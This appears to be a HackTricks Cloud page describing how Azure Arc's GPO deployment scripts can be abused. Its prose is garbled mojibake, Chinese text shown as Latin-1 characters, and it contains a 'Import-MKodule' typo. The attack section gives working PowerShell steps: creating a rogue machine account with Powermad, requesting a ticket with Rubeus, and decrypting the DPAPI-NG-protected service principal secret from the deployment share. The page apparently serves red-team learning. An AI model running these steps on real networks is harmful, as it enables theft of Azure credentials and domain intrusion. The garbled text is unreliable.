# Az - Azure Arcæ˜“å—æ”»å‡»çš„GPOéƒ¨ç½²è„šæœ¬

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### è¯†åˆ«é—®é¢˜

Azure Arcå…è®¸ä½¿ç”¨ç»„ç­–ç•¥å¯¹è±¡æ–¹æ³•å°†æ–°çš„å†…éƒ¨æœåŠ¡å™¨ï¼ˆåŠ å…¥åŸŸæœåŠ¡å™¨ï¼‰é›†æˆåˆ°Azure Arcä¸­ã€‚ä¸ºäº†æ–¹ä¾¿è¿™ä¸€è¿‡ç¨‹ï¼ŒMicrosoftæä¾›äº†ä¸€ä¸ªéƒ¨ç½²å·¥å…·åŒ…ï¼Œç”¨äºå¯åŠ¨å…¥èŒæµç¨‹ã€‚åœ¨ArcEnableServerGroupPolicy.zipæ–‡ä»¶ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°ä»¥ä¸‹è„šæœ¬ï¼šDeployGPO.ps1ã€EnableAzureArc.ps1å’ŒAzureArcDeployment.psm1ã€‚

æ‰§è¡ŒDeployGPO.ps1è„šæœ¬æ—¶ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

1. åœ¨æœ¬åœ°åŸŸå†…åˆ›å»ºAzure ArcæœåŠ¡å™¨å…¥èŒGPOã€‚
2. å°†EnableAzureArc.ps1å…¥èŒè„šæœ¬å¤åˆ¶åˆ°ä¸ºå…¥èŒæµç¨‹åˆ›å»ºçš„æŒ‡å®šç½‘ç»œå…±äº«ä¸­ï¼Œè¯¥å…±äº«è¿˜åŒ…å«Windowså®‰è£…ç¨‹åºåŒ…ã€‚

è¿è¡Œæ­¤è„šæœ¬æ—¶ï¼Œç³»ç»Ÿç®¡ç†å‘˜éœ€è¦æä¾›ä¸¤ä¸ªä¸»è¦å‚æ•°ï¼š**ServicePrincipalId**å’Œ**ServicePrincipalClientSecret**ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦æä¾›å…¶ä»–å‚æ•°ï¼Œå¦‚åŸŸã€æ‰˜ç®¡å…±äº«çš„æœåŠ¡å™¨çš„FQDNå’Œå…±äº«åç§°ã€‚è¿˜å¿…é¡»å‘è„šæœ¬æä¾›ç§Ÿæˆ·IDã€èµ„æºç»„å’Œå…¶ä»–å¿…è¦ä¿¡æ¯ã€‚

ä½¿ç”¨DPAPI-NGåŠ å¯†åœ¨æŒ‡å®šå…±äº«çš„AzureArcDeployç›®å½•ä¸­ç”ŸæˆåŠ å¯†çš„ç§˜å¯†ã€‚åŠ å¯†çš„ç§˜å¯†å­˜å‚¨åœ¨åä¸ºencryptedServicePrincipalSecretçš„æ–‡ä»¶ä¸­ã€‚å¯ä»¥åœ¨DeployGPO.ps1è„šæœ¬ä¸­æ‰¾åˆ°æ­¤æ“ä½œçš„è¯æ®ï¼ŒåŠ å¯†æ˜¯é€šè¿‡ä½¿ç”¨ProtectBase64å’Œ$descriptorä»¥åŠ$ServicePrincipalSecretä½œä¸ºè¾“å…¥æ¥æ‰§è¡Œçš„ã€‚æè¿°ç¬¦ç”±åŸŸè®¡ç®—æœºå’ŒåŸŸæ§åˆ¶å™¨ç»„SIDç»„æˆï¼Œç¡®ä¿ServicePrincipalSecretåªèƒ½è¢«åŸŸæ§åˆ¶å™¨å’ŒåŸŸè®¡ç®—æœºå®‰å…¨ç»„è§£å¯†ï¼Œå¦‚è„šæœ¬æ³¨é‡Šä¸­æ‰€è¿°ã€‚
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### æ”»å‡»

æˆ‘ä»¬æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š

1. æˆ‘ä»¬å·²æˆåŠŸæ¸—é€å†…éƒ¨ç½‘ç»œã€‚
2. æˆ‘ä»¬æœ‰èƒ½åŠ›åˆ›å»ºæˆ–æ§åˆ¶æ´»åŠ¨ç›®å½•ä¸­çš„è®¡ç®—æœºå¸æˆ·ã€‚
3. æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªåŒ…å« AzureArcDeploy ç›®å½•çš„ç½‘ç»œå…±äº«ã€‚

åœ¨ AD ç¯å¢ƒä¸­è·å–è®¡ç®—æœºå¸æˆ·æœ‰å‡ ç§æ–¹æ³•ã€‚å…¶ä¸­æœ€å¸¸è§çš„æ–¹æ³•ä¹‹ä¸€æ˜¯åˆ©ç”¨è®¡ç®—æœºå¸æˆ·é…é¢ã€‚å¦ä¸€ç§æ–¹æ³•æ¶‰åŠé€šè¿‡æ˜“å—æ”»å‡»çš„ ACL æˆ–å…¶ä»–å„ç§é…ç½®é”™è¯¯æ¥ compromise è®¡ç®—æœºå¸æˆ·ã€‚
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
ä¸€æ—¦è·å¾—æœºå™¨è´¦æˆ·ï¼Œå°±æœ‰å¯èƒ½ä½¿ç”¨è¯¥è´¦æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸¦æœ‰netonlyæ ‡å¿—çš„runas.exeå‘½ä»¤ï¼Œæˆ–è€…ä½¿ç”¨Rubeus.exeè¿›è¡Œç¥¨æ®ä¼ é€’ã€‚
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
é€šè¿‡åœ¨å†…å­˜ä¸­å­˜å‚¨æˆ‘ä»¬è®¡ç®—æœºå¸æˆ·çš„TGTï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ¥è§£å¯†æœåŠ¡ä¸»ä½“å¯†ç ã€‚
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatively, we can use [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä»å­˜å‚¨åœ¨ä¸encryptedServicePrincipalSecretæ–‡ä»¶ç›¸åŒçš„ç½‘ç»œå…±äº«ä¸Šçš„ArcInfo.jsonæ–‡ä»¶ä¸­è·å–è¿æ¥åˆ°Azureæ‰€éœ€çš„å‰©ä½™ä¿¡æ¯ã€‚è¯¥æ–‡ä»¶åŒ…å«è¯¸å¦‚ï¼šTenantIdã€servicePrincipalClientIdã€ResourceGroupç­‰è¯¦ç»†ä¿¡æ¯ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Azure CLIæ¥ä½œä¸ºå—æŸçš„æœåŠ¡ä¸»ä½“è¿›è¡Œèº«ä»½éªŒè¯ã€‚

## å‚è€ƒ

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
